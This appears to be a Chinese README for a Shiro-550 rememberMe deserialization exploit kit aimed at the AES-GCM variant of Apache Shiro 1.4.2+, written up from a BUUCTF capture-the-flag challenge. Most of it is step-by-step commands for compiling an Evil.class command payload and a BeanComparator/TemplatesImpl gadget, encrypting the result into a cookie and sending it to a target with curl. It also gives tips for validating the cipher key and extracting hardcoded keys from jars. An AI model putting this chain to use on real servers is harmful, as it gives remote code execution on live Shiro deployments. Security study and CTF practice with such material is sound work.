# Shiro-550 RememberMe 利用（1.4.2+ GCM 版）

实战来源：BUUCTF 场景题 "Shiro"（黑盒攻防 4-flag 场景）flag1 打点，2026-09-09 端到端复现。
WP 见 `CTF大赛WP集合/self-solved/BUUCTF_2026_Shiro_黑盒渗透4flag_GCM版Shiro550打点.md`。

## 文件

- `shiro_enc.py` — rememberMe cookie 加解密（AES-GCM：16B iv ‖ ct ‖ 16B tag，无 padding）
- `Gen.java` — 反射式 gadget 构造：PriorityQueue(BeanComparator("outputProperties"))
  → TemplatesImpl 双字节码；参数：<无害标记|命令> <Evil.class 的 base64>
- `Evil.java` — static-init 执行命令模板（示例：写 marker+读 /flag 回 /home/webapp/）

## 用法

```bash
# 1) 编译 Evil（JDK8 语法；本地高版本 JDK 可加 --add-exports，仅自测需要）
javac -source 8 -target 8 -Xlint:-options -d jout jsrc/Evil.java jsrc/Gen.java
# 2) 生成序列化 payload 并加密成 cookie
B64=$(base64 -w0 jout/Evil.class)
java -cp jout:cb.jar:cc.jar Gen "<命令>" "$B64"
python3 shiro_enc.py e payload.bin > cookie.txt
# 3) 打点
curl -H "Cookie: rememberMe=$(cat cookie.txt)" http://target:8080/
# 4) 回读（本场景 8899 目录列表 / 8080 /file/download 均可）
```

## 关键判别器（key 正确性）

- 垃圾 cookie → deleteMe；正确 key 的 SimplePrincipalCollection 探针 → **无 deleteMe**
- 本地用同版本 shiro-core 的 AbstractRememberMeManager.decrypt() 复现：
  `AEADBadTagException` = 模式/格式错（CBC vs GCM）；key 解析失败在更早一步
- key 来源：jar 反编译后 `javap -v` 读常量池（CUSTOM_CIPHER_KEY / setCipherKey ldc）
